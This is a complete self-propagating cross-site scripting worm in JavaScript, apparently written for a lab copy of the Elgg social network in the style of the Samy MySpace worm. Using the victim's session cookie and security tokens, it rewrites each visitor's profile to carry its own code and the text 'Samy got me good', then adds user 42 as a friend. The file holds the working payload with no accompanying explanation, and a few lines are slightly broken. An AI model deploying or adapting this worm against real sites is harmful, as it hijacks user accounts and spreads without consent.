<script id = "worm" type= "text/javascript">
	//get all variables needed
	var ts = "&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
	var token = "__elgg_token=".concat(elgg.security.token.__elgg_token);
	var sendurl = "/action/friends/add?friend=42".concat(ts).concat("&").concat(token);//samy's id is 42
	var guid = elgg.get_logged_in_user_guid();
	var cookie = document.cookie;
	var user = null;
	user = elgg.get_logged_in_user_entity() ;
	var username = user.name;
	//Create first XMLHttpRequest
	var Ajax = null;
	Ajax = new XMLHttpRequest();
	Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
	//set headers for first request, this request adds the malicious worm onto the visiting user's profile page
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
	Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	Ajax.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
	Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/samy");
	Ajax.setRequestHeader("Cookie",cookie);
	Ajax.setRequestHeader("Connection","keep-alive");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	//set content for first request
	var content=token.concat(ts).concat(name).concat("&description=");
	content = content.concat("<script id = 'worm' type= 'text/javascript'>").concat(escape(document.getElementById("worm").innerHTML)).concat("</").concat("script>");
	var content2 = content.concat("&accesslevel%5Bdescription%5D=2&briefdescription=Samy got me good&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=").concat(guid);
	//send first request
	Ajax.send(content2);
	//create second XMLHttpRequest
	var Ajax2 = null;
	Ajax2 = new XMLHttpRequest();
	Ajax2.open("GET",sendurl,true);
	//set headers for second request
	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax2.setRequestHeader("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/2010Samy got me good0101 Firefox/23.0");
	Ajax2.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	Ajax2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	Ajax2.setRequestHeader("Accept-Encoding", "gzip, deflate");
	Ajax2.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/samy");
	Ajax2.setRequestHeader("Cookie",cookie);
	Ajax2.setRequestHeader("Connection",'keep-alive');
	Ajax2.setRequestHeader("Keep-Alive",'300');
	Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax2.send();//send second request
</script>
